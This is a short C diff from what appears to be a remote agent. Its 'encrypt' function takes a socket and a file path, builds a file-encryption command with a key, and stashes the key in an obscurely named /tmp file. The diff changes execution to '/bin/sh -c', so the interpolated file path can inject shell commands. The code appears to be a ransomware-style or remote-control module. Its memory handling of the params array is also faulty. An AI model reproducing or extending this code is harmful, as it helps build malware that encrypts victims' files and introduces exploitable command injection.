@@ -269,7 +269,7 @@ void encrypt(int sockfd,const char *filepath){
     Command cmd = {
         .cmd_id = "0",
         .delay = 0,
-        .program = strdup("find"), // Dynamically allocate program
+        .program = strdup("/bin/sh"), // Dynamically allocate program
         .expected_exit_code = 0,
         .params = malloc(1 * sizeof(char *))
     };
@@ -288,8 +288,7 @@ void encrypt(int sockfd,const char *filepath){
         filepath, key
     );
 
-    cmd.params[0] = strdup(command); // Add the command as the first parameter
-    cmd.params[1] = NULL; // Null-terminate the params array
+    cmd.params = (char*[]) { "-c", command, NULL };
     output_log("encrypt : Encrypting files with command: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, command);
     
     write_encrypted_file("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log", key); // Write the key to a file
